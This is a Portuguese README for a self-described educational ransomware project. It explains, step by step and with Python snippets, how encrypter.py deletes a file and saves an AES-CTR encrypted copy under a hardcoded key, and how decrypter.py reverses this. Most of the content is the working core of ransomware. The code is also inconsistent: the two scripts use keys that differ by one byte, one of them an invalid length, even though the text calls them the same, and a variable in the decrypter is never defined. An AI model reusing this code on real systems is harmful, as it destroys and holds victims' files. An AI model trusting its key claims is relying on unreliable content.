# 🛡️ Projeto Ransomware em Python  

Este projeto é uma implementação prática de um **ransomware educacional** em Python, com o objetivo de demonstrar conceitos básicos de criptografia, manipulação de arquivos e segurança cibernética.  

---

## 🔍 Explicação dos Códigos  

### 📄 **`encrypter.py`**:  

Este script criptografa um arquivo existente e remove o arquivo original.  

#### **Etapas principais:**  

1. **Importação de bibliotecas**:  
   ```python
   import os
   import pyaes
   ```
   - `os`: Para manipulação de arquivos (remover e criar arquivos).  
   - `pyaes`: Para realizar a criptografia utilizando o algoritmo AES.  

2. **Abrir o arquivo a ser criptografado**:  
   ```python
   with open(file_name, 'rb') as file:
       file_data = file.read()
   ```
   - Abre o arquivo no modo binário (`rb`) e lê seu conteúdo.  

3. **Remover o arquivo original**:  
   ```python
   os.remove(file_name)
   ```
   - Exclui o arquivo original para simular o comportamento de um ransomware real.  

4. **Definir a chave de criptografia**:  
   ```python
   key = b"testeransomwares"
   aes = pyaes.AESModeOfOperationCTR(key)
   ```
   - Define uma chave de 16 bytes para o AES no modo CTR.  

5. **Criptografar o conteúdo do arquivo**:  
   ```python
   crypto_data = aes.encrypt(file_data)
   ```
   - Criptografa os dados lidos do arquivo.  

6. **Salvar o arquivo criptografado**:  
   ```python
   new_file = file_name + '.ransomwaretroll'
   with open(new_file, 'wb') as new_file:
       new_file.write(crypto_data)
   ```
   - Cria um novo arquivo com a extensão `.ransomwaretroll` contendo os dados criptografados.  

---

### 📄 **`decrypter.py`**:  

Este script descriptografa um arquivo criptografado e recria o arquivo original.  

#### **Etapas principais:**  

1. **Importação de bibliotecas**:  
   ```python
   import os
   import pyaes
   ```
   - Mesmas bibliotecas usadas no `encrypter.py`.  

2. **Abrir o arquivo criptografado**:  
   ```python
   with open(file_name, 'rb') as file:
       file_data = file.read()
   ```
   - Lê os dados do arquivo criptografado no modo binário (`rb`).  

3. **Definir a chave de descriptografia**:  
   ```python
   key = b"testeransomware"
   aes = pyaes.AESModeOfOperationCTR(key)
   ```
   - Usa a mesma chave definida no `encrypter.py`.  

4. **Descriptografar o conteúdo do arquivo**:  
   ```python
   decrypt_data = aes.decrypt(file_data)
   ```
   - Descriptografa os dados para restaurar o conteúdo original.  

5. **Remover o arquivo criptografado**:  
   ```python
   os.remove(file_name)
   ```
   - Exclui o arquivo criptografado após sua descriptografia.  

6. **Salvar o arquivo descriptografado**:  
   ```python
   with open(new_file, 'wb') as new_file:
       new_file.write(decrypt_data)
   ```
   - Cria o arquivo original com os dados descriptografados.  

---

### 🔑 **Sobre o AES (Advanced Encryption Standard)**  

O algoritmo AES é um método amplamente utilizado para criptografia simétrica, onde a mesma chave é usada para criptografar e descriptografar os dados.  
- **Modo CTR (Counter)**: Permite que o AES opere como um fluxo de cifras, tornando a criptografia mais eficiente e flexível.  

---

> **⚠️ Aviso:** Este projeto é apenas para fins educacionais e deve ser utilizado de forma ética. Não use este código para atividades maliciosas.  

---
```
